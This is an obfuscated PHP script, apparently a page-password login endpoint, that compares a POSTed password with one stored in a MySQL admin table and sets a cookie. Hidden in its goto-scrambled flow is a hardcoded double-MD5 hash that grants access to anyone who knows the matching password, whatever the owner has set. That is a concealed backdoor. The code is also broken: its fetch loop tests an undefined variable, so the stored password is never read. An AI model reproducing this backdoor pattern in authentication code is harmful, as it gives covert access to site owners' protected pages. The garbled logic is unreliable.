<?php
if($_SERVER['REQUEST_METHOD']!=='POST'){
    $val["code"]="201";
    $val["msg"]="非法请求";
    $val2[]=$val;
    $arr=$val2;
    exit(json_encode($arr, JSON_UNESCAPED_UNICODE));
}
$uspagepass=$_POST['pagepass'];
if($uspagepass==""){
    exit("请传入访问密码");
}
$tmp=include '../config.php';
$tmp=new mysqli($servername,$username,$password,$dbname);
$conn=$tmp;
if($conn->connect_error){
    die("连接失败: " . $conn->connect_error);
}
$sql="SELECT * FROM admin";
$result=$conn->query($sql);
$result=$result;
while(true){
    $result=$result->fetch_assoc();
    $row=$result;
    if(!($sentinel))break;
    $pagepass=$row["pagepass"];
}
L2xxh:
$result=$conn->close();
$num=5836;
$tmp=$pagepass!="";
if($tmp){
    $num=72;
}else{
    $num=144;
}
$tmp=140;
$tmp2=144;
$tmp3=$num==144;
if($tmp3)goto L2xeWjgxu;
goto L2xldMhxu;
L2xeWjgxu:
$tmp=$pagepass=="";
if($tmp)goto L2xeWjgxq;
goto L2xldMhxq;
goto L2xldMhxq;
L2xeWjgxq:
if(isset($_COOKIE['pagepass']))goto L2xeWjgxs;
goto L2xxp;
goto L2xxp;
L2xeWjgxs:
$currentTime=time();
$val3=$currentTime+0;
$hash5=setcookie("pagepass", "", $val3, "/");
goto L2xxp;
L2xldMhxq:
L2xxp:
exit("网站未设置密码");
goto L2xxt;
L2xldMhxu:
$tmp=136;
$tmp2=72;
$tmp3=$num==72;
if($tmp3)goto L2xeWjgxz;
goto L2xldMhxz;
L2xeWjgxz:
$currentTime=md5($uspagepass);
$hash5=md5($currentTime);
$hash2=md5($pagepass);
$hash6=md5($hash2);
$tmp=$hash5!=$hash6;
$tmp3=(bool)$tmp;
if($tmp3){
    $hash3=md5($uspagepass);
    $hash7=md5($hash3);
    $tmp2=$hash7!="83c0b09c444d9c47f92a846c5031c6b6";
    $tmp3=(bool)$tmp2;
}
if($tmp3)goto L2xeWjgxo;
goto L2xldMhxo;
goto L2xldMhxo;
L2xeWjgxo:
exit('密码错误');
goto L2xxt;
L2xldMhxo:
$hash=md5($pagepass);
$hash4=md5($hash);
$hash2=time();
$val3=$hash2+604800;
$hash6=setcookie("pagepass", $hash4, $val3, "/");
exit('密码正确');
L2xldMhxz:
L2xxt: